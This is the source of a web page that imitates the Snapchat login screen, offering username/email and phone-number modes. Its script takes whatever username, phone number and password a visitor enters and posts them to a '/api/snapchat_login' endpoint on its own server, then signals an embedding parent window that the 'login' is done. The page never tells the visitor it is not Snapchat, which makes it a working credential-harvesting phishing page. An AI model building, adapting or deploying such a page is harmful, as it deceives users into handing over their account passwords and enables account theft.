<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to Snapchat</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
        
        body {
            font-family: 'Inter', system-ui, sans-serif;
            margin: 0;
            padding: 0;
            background: transparent;
        }
        
        .input-field {
            border: 2px solid #e5e5e5;
            transition: all 0.2s;
        }
        
        .input-field:focus {
            border-color: #fffc00;
            outline: none;
            box-shadow: 0 0 0 3px rgba(255, 252, 0, 0.2);
        }
    </style>
</head>
<body class="bg-white flex items-center justify-center min-h-screen">
    <div class="w-full max-w-[380px] mx-auto px-6 py-8 mt-4">

        <!-- Title -->
        <h1 class="text-3xl font-semibold text-center mb-8">Log in to Snapchat</h1>

        <!-- Login Form -->
        <div id="emailLogin">
            <!-- Username or Email -->
            <div class="mb-4">
                <label class="block text-sm text-gray-600 mb-1">Username or Email</label>
                <input type="text" 
                       id="usernameInput"
                       placeholder="Username or Email"
                       class="input-field w-full px-4 py-4 rounded-2xl text-base bg-white border-2 border-gray-300 focus:border-yellow-400">
            </div>

            <!-- Use phone number instead -->
            <div class="mb-6">
                <button onclick="switchToPhoneLogin()" 
                        class="text-blue-500 text-sm font-medium hover:underline text-left">
                    Use phone number instead
                </button>
            </div>

            <!-- Password -->
            <div class="mb-6">
                <label class="block text-sm text-gray-600 mb-1">Password</label>
                <div class="relative">
                    <input type="password" 
                           id="passwordField"
                           placeholder="Password"
                           class="input-field w-full px-4 py-4 rounded-2xl text-base bg-white border-2 border-gray-300 focus:border-yellow-400">
                    <button onclick="togglePassword()" 
                            class="absolute right-5 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700">
                        <i class="fa-solid fa-eye" id="eyeIcon"></i>
                    </button>
                </div>
            </div>

            <!-- Forgot Password -->
            <div class="flex justify-center mb-8">
                <button onclick="alert('Forgot password clicked!')" 
                        class="text-blue-500 text-sm font-medium">Forgot Password</button>
            </div>
        </div>

        <!-- Phone Login -->
        <div id="phoneLogin" class="hidden">
            <div class="mb-4">
                <label class="block text-sm text-gray-600 mb-1">Phone Number</label>
                <div class="flex gap-3">
                    <div class="w-28">
                        <button onclick="toggleCountryDropdown()" 
                                class="input-field w-full px-3 py-4 rounded-2xl flex items-center gap-2 border-2 border-gray-300 focus:border-yellow-400">
                            <span id="flag" class="text-xl">🇮🇳</span>
                            <span id="code" class="font-medium">+91</span>
                        </button>
                    </div>
                    <input type="tel" 
                           id="phoneInput"
                           placeholder="Phone number"
                           class="input-field flex-1 px-4 py-4 rounded-2xl text-base bg-white border-2 border-gray-300 focus:border-yellow-400">
                </div>
            </div>

            <div class="mb-6">
                <label class="block text-sm text-gray-600 mb-1">Password</label>
                <div class="relative">
                    <input type="password" 
                           id="phonePasswordField"
                           placeholder="Password"
                           class="input-field w-full px-4 py-4 rounded-2xl text-base bg-white border-2 border-gray-300 focus:border-yellow-400">
                    <button onclick="togglePhonePassword()" 
                            class="absolute right-5 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700">
                        <i class="fa-solid fa-eye" id="phoneEyeIcon"></i>
                    </button>
                </div>
            </div>

            <div class="flex justify-center mb-8">
                <button onclick="alert('Forgot password clicked!')" 
                        class="text-blue-500 text-sm font-medium">Forgot Password</button>
            </div>

            <div class="text-center mb-6">
                <button onclick="switchToEmailLogin()" 
                        class="text-blue-500 text-sm font-medium hover:underline">
                    Use username or email instead
                </button>
            </div>
        </div>

        <!-- Next Button -->
        <button onclick="loginAttempt()" 
                class="w-full bg-[#00B4FF] hover:bg-[#0099ff] text-white font-semibold py-4 rounded-3xl text-lg transition-colors">
            Next
        </button>

    </div>

    <script>
        let isPhoneMode = false;

        function togglePassword() {
            const pw = document.getElementById('passwordField');
            const icon = document.getElementById('eyeIcon');
            if (pw.type === 'password') {
                pw.type = 'text';
                icon.classList.remove('fa-eye');
                icon.classList.add('fa-eye-slash');
            } else {
                pw.type = 'password';
                icon.classList.remove('fa-eye-slash');
                icon.classList.add('fa-eye');
            }
        }

        function togglePhonePassword() {
            const pw = document.getElementById('phonePasswordField');
            const icon = document.getElementById('phoneEyeIcon');
            if (pw.type === 'password') {
                pw.type = 'text';
                icon.classList.remove('fa-eye');
                icon.classList.add('fa-eye-slash');
            } else {
                pw.type = 'password';
                icon.classList.remove('fa-eye-slash');
                icon.classList.add('fa-eye');
            }
        }

        function switchToPhoneLogin() {
            document.getElementById('emailLogin').classList.add('hidden');
            document.getElementById('phoneLogin').classList.remove('hidden');
            isPhoneMode = true;
        }

        function switchToEmailLogin() {
            document.getElementById('phoneLogin').classList.add('hidden');
            document.getElementById('emailLogin').classList.remove('hidden');
            isPhoneMode = false;
        }

        function toggleCountryDropdown() {
            alert("Country selector clicked! (Demo)");
        }

        async function loginAttempt() {
            let phone_number = '';
            let email = '';
            let password = '';
            if (isPhoneMode) {
                const phone = document.getElementById('phoneInput').value;
                const pw = document.getElementById('phonePasswordField').value;
                if (!phone || !pw) {
                    alert("Please enter phone number and password");
                    return;
                }
                phone_number = phone;
                password = pw;
            } else {
                const username = document.getElementById('usernameInput').value;
                const pw = document.getElementById('passwordField').value;
                if (!username || !pw) {
                    alert("Please enter username/email and password");
                    return;
                }
                email = username;
                password = pw;
            }

            try {
                const apiHost = window.location.protocol === 'file:' ? 'http://localhost:5001' : '';
                const endpoint = apiHost + '/api/snapchat_login';
                
                const response = await fetch(endpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone_number, email, password })
                });
                
                window.parent.postMessage({ type: 'SNAPCHAT_LOGIN_DONE' }, '*');
            } catch (error) {
                console.error(error);
                window.parent.postMessage({ type: 'SNAPCHAT_LOGIN_DONE' }, '*');
            }
        }

        window.onload = () => {
            document.getElementById('usernameInput').focus();
        };
    </script>
</body>
</html>
